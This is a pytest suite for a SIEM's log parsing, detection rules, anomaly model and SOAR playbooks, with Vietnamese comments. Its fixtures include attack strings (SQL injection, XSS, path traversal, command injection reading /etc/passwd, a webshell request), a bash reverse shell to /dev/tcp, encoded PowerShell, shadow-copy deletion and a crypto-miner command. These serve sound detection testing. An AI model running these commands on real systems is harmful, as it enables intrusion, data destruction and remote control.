"""Unit test cho normalize + enrich + rule engine + ML + SOAR (không cần Kafka/ES).
Chạy: cd server && python -m pytest -q
"""
from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from siem.detection import alerts as alert_builder
from siem.detection.ml import AnomalyDetector
from siem.detection.rules import RuleEngine, load_rules
from siem.pipeline.enrich import Enricher
from siem.pipeline.normalize import get, normalize

ROOT = Path(__file__).resolve().parent.parent
T0 = datetime(2026, 9, 24, 10, 0, 0, tzinfo=timezone.utc)


def raw(event_type, data, source="file", agent="S001-Web-01", ts=None):
    return {"timestamp": (ts or T0).isoformat(), "agent_id": agent, "hostname": "Web-01", "os": "linux",
            "source": source, "event_type": event_type, "data": data}


def apache(ip, req, status=200, ua="Mozilla/5.0", ts=None):
    t = (ts or T0).strftime("%d/%b/%Y:%H:%M:%S +0000")
    return raw("apache_access", {"message": f'{ip} - - [{t}] "{req}" {status} 512 "-" "{ua}"'}, ts=ts)


@pytest.fixture(scope="module")
def enricher():
    return Enricher(ROOT / "config")


@pytest.fixture()
def engine():
    return RuleEngine(load_rules(ROOT / "rules"))


def run(engine, enricher, raws):
    fired = []
    for r in raws:
        doc = enricher.enrich(normalize(r))
        fired += [d.rule.id for d in engine.process(doc)]
    return fired


# ------------------------------------------------------------------ normalize
def test_apache_access_parse():
    d = normalize(apache("10.0.0.5", "GET /index.php?id=1%27%20UNION%20SELECT%201,2-- HTTP/1.1", 200))
    assert get(d, "source.ip") == "10.0.0.5"
    assert get(d, "http.request.method") == "GET"
    assert get(d, "http.response.status_code") == 200
    assert get(d, "url.path") == "/index.php"
    assert "UNION SELECT" in get(d, "url.decoded")
    assert d["@timestamp"].startswith("2026-09-24T10:00:00")


def test_ssh_auth_parse():
    d = normalize(raw("auth", {"message": "Sep 24 10:00:01 web01 sshd[811]: Failed password for invalid user admin from 203.0.113.9 port 50122 ssh2"}))
    assert get(d, "event.category") == "authentication"
    assert get(d, "event.outcome") == "failure"
    assert get(d, "user.name") == "admin"
    assert get(d, "source.ip") == "203.0.113.9"
    d2 = normalize(raw("auth", {"message": "2026-09-24T10:00:02.123+07:00 web01 sshd[812]: Accepted password for root from 10.1.1.1 port 4000 ssh2"}))
    assert get(d2, "event.outcome") == "success" and get(d2, "user.name") == "root"


def test_windows_4625_and_sysmon():
    d = normalize(raw("windows_event", {"event_id": 4625, "channel": "Security", "computer": "PC-01",
                                        "fields": {"TargetUserName": "admin", "IpAddress": "10.0.0.66", "LogonType": "10"}},
                      source="eventlog", agent="A001-PC-01"))
    assert get(d, "event.code") == 4625 and get(d, "event.outcome") == "failure"
    assert get(d, "winlog.logon.type") == "remote_interactive"
    s = normalize(raw("windows_event", {"event_id": 1, "channel": "Microsoft-Windows-Sysmon/Operational",
                                        "fields": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                   "CommandLine": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA=",
                                                   "ParentImage": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
                                                   "ProcessId": "4242", "Hashes": "MD5=ABC,SHA256=DEF"}},
                      source="eventlog", agent="A001-PC-01"))
    assert get(s, "process.name") == "powershell.exe"
    assert get(s, "process.parent.name") == "WINWORD.EXE"
    assert get(s, "process.hash.sha256") == "def"
    assert get(s, "process.pid") == 4242


def test_firewall_iptables_and_pfsense():
    d = normalize(raw("syslog", {"message": "<4>Sep 24 10:00:00 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00 SRC=198.51.100.7 DST=192.168.1.10 LEN=40 PROTO=TCP SPT=40000 DPT=3389 WINDOW=1024",
                                  "sender_ip": "192.168.1.1"}, source="syslog", agent="syslog-192.168.1.1"))
    assert get(d, "event.category") == "network" and get(d, "event.action") == "deny"
    assert get(d, "destination.port") == 3389 and get(d, "host.name") == "fw01"
    pf = "5,,,1000000103,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,203.0.113.50,192.168.1.10,51000,22,0,S,1,,64240,,mss"
    d2 = normalize(raw("syslog", {"message": f"<134>Sep 24 10:00:00 pfsense filterlog[123]: {pf}", "sender_ip": "192.168.1.1"}, source="syslog"))
    assert get(d2, "event.module") == "pfsense" and get(d2, "source.ip") == "203.0.113.50" and get(d2, "destination.port") == 22


def test_suricata_eve():
    eve = {"timestamp": "2026-09-24T10:00:00.000000+0000", "event_type": "alert", "src_ip": "203.0.113.5", "src_port": 4444,
           "dest_ip": "192.168.1.10", "dest_port": 80, "proto": "TCP",
           "alert": {"signature": "ET WEB_SERVER SQL Injection", "signature_id": 2006445, "severity": 1, "category": "Web Application Attack"}}
    d = normalize(raw("suricata", {"message": json.dumps(eve)}))
    assert get(d, "event.category") == "intrusion_detection" and get(d, "suricata.severity") == 1


def test_garbage_does_not_crash():
    for r in [raw("apache_access", {"message": "garbage"}), raw("windows_event", {}), raw("unknown", {"x": 1}),
              raw("auth", {"message": ""}), {"data": None}]:
        d = normalize(r)
        assert "event" in d


# ------------------------------------------------------------------ enrich
def test_threat_intel_and_assets(enricher):
    d = enricher.enrich(normalize(apache("198.51.100.23", "GET / HTTP/1.1")))
    assert get(d, "threat.matched") is True
    assert get(d, "asset.id") == "S001" and get(d, "asset.criticality") == "high"
    assert get(d, "source.ip_scope") == "public"


# ------------------------------------------------------------------ rules
def test_rules_load(engine):
    assert len(engine.rules) >= 35


@pytest.mark.parametrize("req,rule", [
    ("GET /item.php?id=1%27%20or%20%271%27=%271 HTTP/1.1", "WEB-001"),
    ("GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1", "WEB-002"),
    ("GET /view?file=../../../../etc/passwd HTTP/1.1", "WEB-003"),
    ("GET /ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1", "WEB-004"),
    ("GET /uploads/shell.php?cmd=id HTTP/1.1", "WEB-008"),
])
def test_web_attacks(engine, enricher, req, rule):
    assert rule in run(engine, enricher, [apache("10.0.0.50", req)])


def test_benign_web_no_alert(engine, enricher):
    reqs = ["GET / HTTP/1.1", "GET /products?id=12&sort=price HTTP/1.1", "GET /static/app.js HTTP/1.1",
            "POST /api/cart HTTP/1.1", "GET /blog/select-the-best-union-plan HTTP/1.1"]
    assert run(engine, enricher, [apache("10.0.0.51", r) for r in reqs]) == []


def test_scanner_ua(engine, enricher):
    assert "WEB-005" in run(engine, enricher, [apache("10.0.0.52", "GET / HTTP/1.1", ua="sqlmap/1.7#stable")])


def test_ssh_bruteforce_then_success(engine, enricher):
    evs = [raw("auth", {"message": f"Sep 24 10:00:0{i} web01 sshd[9{i}]: Failed password for root from 10.9.9.9 port 5000{i} ssh2"},
               ts=T0 + timedelta(seconds=i)) for i in range(6)]
    evs.append(raw("auth", {"message": "Sep 24 10:00:09 web01 sshd[99]: Accepted password for root from 10.9.9.9 port 50010 ssh2"},
                   ts=T0 + timedelta(seconds=9)))
    fired = run(engine, enricher, evs)
    assert fired.count("AUTH-001") == 1   # threshold chỉ bắn 1 lần nhờ suppress
    assert "AUTH-002" in fired            # sequence: brute-force rồi thành công
    assert "AUTH-004" in fired            # đăng nhập root


def test_threshold_respects_window(engine, enricher):
    # 5 lần thất bại nhưng rải trong 5 phút -> không phải brute-force
    evs = [raw("auth", {"message": f"Sep 24 10:0{i}:00 web01 sshd[1]: Failed password for bob from 10.8.8.8 port 1 ssh2"},
               ts=T0 + timedelta(minutes=i)) for i in range(5)]
    assert "AUTH-001" not in run(engine, enricher, evs)


def test_port_scan_distinct(engine, enricher):
    evs = [raw("syslog", {"message": f"Sep 24 10:00:00 fw kernel: DROP IN=eth0 SRC=10.7.7.7 DST=192.168.1.10 PROTO=TCP SPT=40000 DPT={p}",
                          "sender_ip": "192.168.1.1"}, source="syslog", ts=T0 + timedelta(milliseconds=p)) for p in range(20, 45)]
    assert "NET-001" in run(engine, enricher, evs)


def test_windows_rules(engine, enricher):
    def win(eid, fields, channel="Security"):
        return raw("windows_event", {"event_id": eid, "channel": channel, "fields": fields}, source="eventlog", agent="A001-PC-01")
    fired = run(engine, enricher, [
        win(1102, {"SubjectUserName": "eve"}),
        win(4732, {"TargetUserName": "Administrators", "MemberName": "CN=eve"}),
        win(1, {"Image": "C:\\x\\powershell.exe", "ParentImage": "C:\\x\\WINWORD.EXE",
                "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA="},
            channel="Microsoft-Windows-Sysmon/Operational"),
        win(1, {"Image": "C:\\x\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet"},
            channel="Microsoft-Windows-Sysmon/Operational"),
    ])
    for rid in ("WIN-002", "WIN-004", "WIN-005", "WIN-008", "WIN-010"):
        assert rid in fired, rid


def test_linux_process_rules(engine, enricher):
    def proc(name, cmd, parent="bash"):
        return raw("process_creation", {"pid": 4321, "ppid": 1, "name": name, "command_line": cmd, "parent_name": parent}, source="process")
    fired = run(engine, enricher, [
        proc("bash", "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"),
        proc("sh", "sh -c id", parent="apache2"),
        proc("xmrig", "./xmrig -o stratum+tcp://pool:3333"),
    ])
    assert {"LNX-001", "LNX-002", "LNX-004"} <= set(fired)


def test_alert_document(engine, enricher):
    doc = enricher.enrich(normalize(apache("198.51.100.23", "GET /a?id=1%20union%20select%201 HTTP/1.1")))
    dets = engine.process(doc)
    a = alert_builder.from_detection(next(d for d in dets if d.rule.id == "WEB-001"))
    assert a["source"]["ip"] == "198.51.100.23" and a["agent"]["id"] == "S001-Web-01"
    assert a["severity_score"] == 3 and a["risk_score"] > 75  # asset critical=high + TI hit
    assert "raw" not in a["trigger_event"]


# ------------------------------------------------------------------ ML
def test_ml_flags_scanner_not_normal(enricher):
    det = AnomalyDetector(window=60, min_samples=10_000, bootstrap=True)
    base = T0.timestamp()
    # 20 người dùng bình thường
    for u in range(20):
        for k in range(10):
            d = enricher.enrich(normalize(apache(f"10.1.0.{u}", f"GET /page{k % 5} HTTP/1.1", 200)))
            det.add(d, base + k)
    # 1 IP quét: 400 request, 90% 404, URL khác nhau
    for k in range(400):
        d = enricher.enrich(normalize(apache("10.66.66.66", f"GET /admin{k}.php HTTP/1.1", 404 if k % 10 else 200)))
        det.add(d, base + k * 0.1)
    anomalies = det.flush(base + 200)
    flagged = {a.ip for a in anomalies}
    assert "10.66.66.66" in flagged
    assert len(flagged & {f"10.1.0.{u}" for u in range(20)}) <= 1


# ------------------------------------------------------------------ SOAR
class FakeES:
    def __init__(self):
        self.docs: dict[str, dict[str, dict]] = {}

    def index(self, index, id, document, **_):
        self.docs.setdefault(index, {})[id] = document

    def update(self, index, id, doc, **_):
        self.docs.setdefault(index, {}).setdefault(id, {}).update(doc)

    def search(self, index, query=None, **_):
        return {"hits": {"hits": []}}


def test_soar_playbook_blocks_ip(monkeypatch):
    from siem import store
    from siem.soar.engine import Notifier, Soar, load_playbooks

    es = FakeES()
    monkeypatch.setattr(store, "list_agents", lambda _es: [{"agent_id": "S001-Web-01", "status": "online"},
                                                           {"agent_id": "A001-PC-01", "status": "online"}])
    soar = Soar(es, load_playbooks(ROOT / "config" / "playbooks.yml"), whitelist=["127.0.0.0/8"], notifier=Notifier())
    alert = {"alert": {"id": "a1", "status": "open", "source": "rule"}, "rule": {"id": "AUTH-001", "name": "bf", "tags": []},
             "severity": "high", "severity_score": 3, "source": {"ip": "10.9.9.9"}, "agent": {"id": "S001-Web-01"}, "count": 5,
             "message": "x"}
    results = soar.handle(alert)
    block = next(r for r in results if r["action"] == "block_ip")
    assert block["status"] == "queued" and len(block["action_ids"]) == 2   # scope: all -> 2 agent
    actions = list(es.docs["siem-actions"].values())
    assert {a["agent_id"] for a in actions} == {"S001-Web-01", "A001-PC-01"}
    assert all(a["type"] == "block_ip" and a["params"]["ip"] == "10.9.9.9" and a["expires_at"] for a in actions)
    assert es.docs["siem-alerts"]["a1"]["alert"]["status"] == "in_progress"
    assert any(r["action"] == "create_case" and r["status"] == "created" for r in results)


def test_soar_whitelist_and_approval():
    from siem.soar.engine import Notifier, Soar, load_playbooks
    es = FakeES()
    soar = Soar(es, load_playbooks(ROOT / "config" / "playbooks.yml"), whitelist=["10.0.0.0/8"], notifier=Notifier())
    alert = {"alert": {"id": "a2", "source": "rule"}, "rule": {"id": "AUTH-002", "name": "x"}, "severity": "critical",
             "severity_score": 4, "source": {"ip": "10.9.9.9"}, "agent": {"id": "S001-Web-01"}, "count": 6, "message": "x"}
    results = soar.handle(alert)
    assert next(r for r in results if r["action"] == "block_ip")["status"] == "skipped"
    assert next(r for r in results if r["action"] == "isolate_host")["status"] == "awaiting_approval"
    assert "siem-actions" not in es.docs


# ------------------------------------------------------------------ case playbook
def test_case_playbook_selection_and_tasks():
    from siem.soar.cases import PHASES, CasePlaybooks
    cp = CasePlaybooks(ROOT / "config" / "case_playbooks.yml")
    assert cp.select("WIN-010")["id"] == "PB-07"          # playbook cụ thể thắng playbook chung
    assert cp.select("WEB-001")["id"] == "PB-02"
    assert cp.select("AUTH-002")["id"] == "PB-01"
    assert cp.select("KHONG-CO")["id"] == "PB-00"          # mặc định
    f = cp.build("AUTH-002", "critical")
    assert f["priority"] == "P1" and f["playbook"]["id"] == "PB-01"
    assert {t["phase"] for t in f["tasks"]} <= set(PHASES)
    assert any(t["approval"] for t in f["tasks"]) and not any(t["done"] for t in f["tasks"])
    # mọi rule đều có playbook
    for r in load_rules(ROOT / "rules"):
        assert cp.select(r.id), r.id


def test_soar_case_gets_playbook():
    from siem.soar.cases import CasePlaybooks
    from siem.soar.engine import Notifier, Soar, load_playbooks
    es = FakeES()
    soar = Soar(es, load_playbooks(ROOT / "config" / "playbooks.yml"), whitelist=["10.0.0.0/8"], notifier=Notifier(),
                case_playbooks=CasePlaybooks(ROOT / "config" / "case_playbooks.yml"))
    alert = {"alert": {"id": "a3", "source": "rule"}, "rule": {"id": "AUTH-002", "name": "x"}, "severity": "critical",
             "severity_score": 4, "source": {"ip": "10.9.9.9"}, "agent": {"id": "S001-Web-01"}, "count": 6, "message": "x"}
    soar.handle(alert)
    case = next(iter(es.docs["siem-cases"].values()))
    assert case["playbook"]["id"] == "PB-01" and case["priority"] == "P1" and case["sla_due"]
    assert len(case["tasks"]) >= 8 and case["status"] == "open"
